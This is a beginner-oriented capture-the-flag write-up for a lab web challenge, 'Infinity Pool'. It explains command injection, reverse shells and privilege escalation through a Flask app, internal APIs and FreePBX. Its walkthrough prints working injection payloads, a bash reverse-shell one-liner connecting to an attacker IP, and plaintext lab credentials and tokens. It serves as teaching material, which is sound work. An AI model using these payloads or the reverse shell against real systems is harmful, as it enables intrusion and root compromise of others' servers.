# Infinity Pool — Detailed Notes

## Hacker Holidays: Byte Lotus Hotel Series

---

## What Is This Topic?

This is a **Boot2Root web exploitation** challenge. In simple terms: we're given a website, and our job is to find bugs that let us go from having no access at all, to a normal user (`web`), and finally all the way up to **root** (the most powerful user on a system, who can control absolutely everything).

The challenge is called "Infinity Pool" because the storyline hints that _"the network has no visible edge"_ — meaning until you dig deep, you won't realize how much is actually running inside the server that isn't visible from the outside.

---

## Technologies Used (Table)

|Technology|What it is (simple explanation)|
|---|---|
|**Flask (Python)**|A lightweight web framework used to build websites/APIs in Python. Like running a small shop with a simple counter — Flask is that simple counter for web apps.|
|**Gunicorn**|The server that actually serves a Flask app in production — like a waiter standing between the kitchen (Flask code) and the customer (browser request).|
|**FreePBX**|An open-source phone system (PBX) management tool — like an office's telephone exchange system that routes calls.|
|**Asterisk**|The actual engine running behind FreePBX that handles calls — like a car's engine, while FreePBX is the dashboard/steering wheel.|
|**UCP (User Control Panel)**|A FreePBX portal where regular employees (extension users) manage their own call settings, voicemail, etc. — not the admin panel, more like "staff's own small control room."|
|**AMI (Asterisk Manager Interface)**|A raw text-based protocol used to programmatically control Asterisk — like a remote control that lets you send commands to a TV without physically pressing buttons.|
|**Bash reverse shell**|A trick where we force the target server to connect back to our machine and hand us its terminal — like calling someone and telling them to give you remote control of their computer.|

---

## Beginner Concepts (Real-Life Analogies)

### 1. What is Command Injection?

Imagine a hotel has a staff tool that simply "pings a server and tells you if it's alive." But the developer built this tool by taking the user's input and putting it **directly** into the system's terminal, without checking whether it contains anything extra.

**Real-life analogy:** Imagine telling a waiter _"I'd like a Pizza"_ and the waiter, without thinking, walks straight to the kitchen and says _"Make a Pizza."_ But if a customer instead says _"I'd like a Pizza; also open the safe"_ and the waiter blindly follows both instructions — that's command injection. The system mistook the user's **data** for a **command**.

In this challenge, we entered `127.0.0.1;whoami` into the `host` field. The server thought "this is just one ping command," but the part after the `;` actually became a **separate command** that ran independently.

### 2. What is a Reverse Shell?

Once we find command injection on a server, we could technically run one command at a time using curl. But that's slow and limited. So we do a trick: we tell the server "open your own terminal and connect back to me."

**Analogy:** Instead of inviting a doctor to your house one time, you give them **remote access** to your whole house so they can check in whenever needed. In a reverse shell, the target machine "calls back" to our Kali machine and hands over its bash shell.

### 3. What is Privilege Escalation?

At first we only got a low-privilege user called `web`. But we needed **root** — the "boss" of the entire system. So we had to find a place where some service was running as **root**, and find a way to reach it.

**Analogy:** Imagine you only have access to the reception desk of an office building, but you need to reach the CEO's office (where everything is controlled). You have to search — maybe there's an unlocked door, or an employee who accidentally reveals a password, etc.

---

## Beginner-to-Challenge Progression — Step by Step (Teaching It Like a Younger Sibling With Zero Prior Knowledge)

Let's imagine explaining this to a complete beginner who has never done a CTF before. Here's how we got from nothing to root, step by step:

### Level 0: The very first step — looking at the website

Whenever you get a web challenge, the first thing to do is look at the website — like taking a full tour of a house before buying it. We used `curl` to request the homepage, then looked at its JavaScript file (`app.js`).

**What did we find here?** A developer's comment saying there's a secret staff tool at `/status` that's hidden from `robots.txt`.

**Lesson:** Always check a website's JS files, comments, and `robots.txt` — developers sometimes forget to remove sensitive info.

### Level 1: Finding the hidden page

`robots.txt` is a file that tells search engines "don't index these pages." But it also tells us something is hidden there! We found `/status` and `/internal/netcheck`.

### Level 2: Understanding the vulnerability

`/status` had a simple form that took a "host" and pinged it. We thought — "if this server is running the `ping` command server-side, maybe we can inject our own commands too."

We tested: `host=127.0.0.1;whoami` — and bingo! The server ran our `whoami` command as well.

**Lesson:** Whenever a web app appears to run "system commands" (ping, traceroute, nslookup, etc.), always try command injection.

### Level 3: Getting a shell

Now that we knew we could run commands, we injected a **reverse shell** command so we could work interactively, instead of sending one curl request at a time.

**Challenge we hit:** `curl -d` doesn't properly encode special characters (like `&`). We fixed this by using `--data-urlencode`.

### Level 4: Getting the user flag

Once we had a shell, we checked `/home/web/user.txt` — this was the first "flag," confirming we had successfully gained user-level access.

### Level 5: Exploring the system (Enumeration)

This is where the real work begins. We ran `ps aux` (a list of running processes) and discovered the same web app stack was running under **three different users**:

- `web` (the access we already had)
- `root` (our target — the most powerful user)
- `svc-watch` (another service account)

**Lesson:** Always check `ps aux` and `ss -tlnp` (listening ports) — they reveal what else is running inside the server that isn't visible from outside.

### Level 6: Finding internal APIs

We noticed the root-owned service was serving an API on port 9000, and another service (svc-watch) on port 3000. We queried both.

The `watchtower` service (svc-watch) returned its `/api/config`, which **leaked FreePBX login credentials** — someone had accidentally exposed these in an internal config.

**Lesson:** Internal APIs can be vulnerable too, even if they're meant for "internal use only." If we can reach them, they're external to us.

### Level 7: Logging into FreePBX

We had FreePBX login credentials, but the login didn't work like a normal HTML form — it used a JavaScript-driven AJAX request. We had to read the source code (`ucp.js` and `User.class.php`) to figure out the exact request format.

**Lesson:** When a login form doesn't work with curl, read its JavaScript files — that's usually where the exact API contract is defined.

### Level 8: Finding the automation key

After logging in, we explored the UCP portal and added a "Voicemail" widget — inside it, we found the root-owned automation service's **Bearer token**.

**Lesson:** Secrets aren't only found in config files — sometimes they're hidden inside a UI element within the application itself.

### Level 9: Second command injection — this time as root!

The root-owned automation service had a "report export" endpoint with a `report` field. We tried the same trick we used on the edge app:

```json
{"report": "test;id;#"}
```

And confirmed: `uid=0(root)` — meaning this command was also running with **root** privileges!

### Level 10: The root flag

The final step — we replaced `id` with `cat /root/root.txt` and got the root flag:

```
THM{tr4c3d_t0_th3_h0r1z0n}
```

---

## Vulnerabilities Summary

1. **Unauthenticated OS Command Injection** — The `/internal/netcheck` endpoint concatenated the `host` parameter directly into a `ping` command without sanitization.
2. **Sensitive Data Exposure** — The internal `watchtower` service's `/api/config` endpoint leaked plaintext credentials (FreePBX UCP username/password).
3. **Hardcoded/Default Credentials** — The FreePBX UCP template credentials had never been rotated, as confirmed by an internal ops note.
4. **Sensitive Data in UI** — The automation service's Bearer API key was exposed inside a voicemail widget.
5. **Second OS Command Injection (Privileged)** — The root-owned `automation` service's `/jobs/export` endpoint inserted the `report` field directly into a `tar` command without sanitization, granting root-level RCE.

---

## Full Command Walkthrough (with "Why")

```bash
# 1) Checked app.js to find hidden endpoints
curl http://10.49.176.39/static/app.js
# WHY: Developers sometimes leave sensitive info in comments

# 2) Confirmed via robots.txt
curl http://10.49.176.39/robots.txt
# WHY: Disallowed paths hint at "something here was meant to be hidden"

# 3) Tested command injection
curl -X POST http://10.49.176.39/internal/netcheck -d "host=127.0.0.1;whoami"
# WHY: If a username appears in the output, it confirms an OS command is executing

# 4) Triggered a reverse shell (with correct encoding)
curl -X POST http://10.49.176.39/internal/netcheck \
  --data-urlencode "host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"
# WHY: --data-urlencode properly encodes special characters (like &)

# 5) Read the user flag
cat /home/web/user.txt
# WHY: Confirms we successfully have user-level access

# 6) Checked running processes
ps aux
# WHY: Reveals what other (hidden) services are running inside the server

# 7) Checked the root-owned automation service's health endpoint
curl -sS http://127.0.0.1:9000/health
# WHY: Even without auth, this endpoint reveals it runs as root and how to authenticate

# 8) Extracted config from the watchtower service
curl -sS http://127.0.0.1:3000/api/config
# WHY: An internal-only service was accidentally leaking credentials

# 9) FreePBX UCP login (using the exact ajax.php contract)
curl -sb cookies.txt -c cookies.txt \
  --data-urlencode "token=${TOKEN}" \
  --data-urlencode "username=FreePBXUCPTemplateCreator" \
  --data-urlencode "password=St4yN0t1c3d_2026" \
  --data-urlencode "module=User" \
  --data-urlencode "command=login" \
  "http://127.0.0.1:8080/ucp/ajax.php"
# WHY: FreePBX's login isn't a normal form POST — it requires an AJAX request with a command=login parameter

# 10) Second command injection using the root Bearer key
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"x;cat /root/root.txt;#"}'
# WHY: The report field was also being injected directly into a shell command, this time with root privileges
```

---

_Obito Uchiha — Team AKATSUKI_